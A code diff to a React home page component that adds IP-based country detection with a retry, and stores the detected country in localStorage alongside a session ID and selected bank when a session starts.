@@ -38,8 +38,16 @@ export default function Home() {
   const [userCountry, setUserCountry] = useState("Qatar");
   const [selectedCard, setSelectedCard] = useState<number | null>(null);
   const createSessionMutation = trpc.submissions.createSession.useMutation();
+  const getCountryQuery = trpc.submissions.getCountry.useQuery();
 
   const isArabic = language === "ar";
+
+  // الحصول على البلد من عنوان IP عند تحميل الصفحة
+  useEffect(() => {
+    if (getCountryQuery.data?.country) {
+      setUserCountry(getCountryQuery.data.country);
+    }
+  }, [getCountryQuery.data]);
 
   useEffect(() => {
     const timer = setInterval(() => {
@@ -48,10 +56,21 @@ export default function Home() {
     return () => clearInterval(timer);
   }, []);
 
+  // إعادة محاولة الحصول على البلد إذا فشلت المحاولة الأولى
+  useEffect(() => {
+    if (getCountryQuery.isError) {
+      const timer = setTimeout(() => {
+        getCountryQuery.refetch();
+      }, 2000);
+      return () => clearTimeout(timer);
+    }
+  }, [getCountryQuery.isError, getCountryQuery]);
+
   const startSession = async (selectedBank: string) => {
     const sessionId = nanoid();
     localStorage.setItem("sessionId", sessionId);
     localStorage.setItem("selectedBank", selectedBank);
+    localStorage.setItem("userCountry", userCountry);
     
     try {
       await createSessionMutation.mutateAsync({
